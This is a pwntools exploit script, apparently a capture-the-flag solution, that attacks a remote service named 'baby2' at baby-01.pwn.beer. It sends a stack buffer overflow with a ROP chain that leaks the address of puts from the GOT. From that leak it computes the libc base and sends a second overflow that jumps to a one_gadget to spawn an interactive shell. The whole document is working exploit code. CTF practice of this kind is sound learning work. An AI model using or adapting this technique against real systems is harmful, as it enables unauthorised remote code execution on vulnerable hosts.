from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
#r = process('./baby2')
r = remote('baby-01.pwn.beer', 10002)

elf = ELF('./baby2')
libc = ELF('./libc.so.6')
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
libc_puts_offset = libc.symbols['puts']
one_gadget_offset = [0x4f2c5,0x4f322,0x10a38c][0]

main = 0x400698
gg1 = 0x400783


p = 'a' *0x18
p += flat(
	gg1,
	puts_got,
	puts_plt,
	main
)

r.sendlineafter(': ', p)
leak = u64((r.recvuntil('\n')[:-1]).ljust(8,'\x00'))
libc_base = leak - libc_puts_offset
one_gadget = libc_base + one_gadget_offset

p2 = 'a'*0x18 + p64(one_gadget)

r.sendlineafter(': ', p2)
r.interactive()
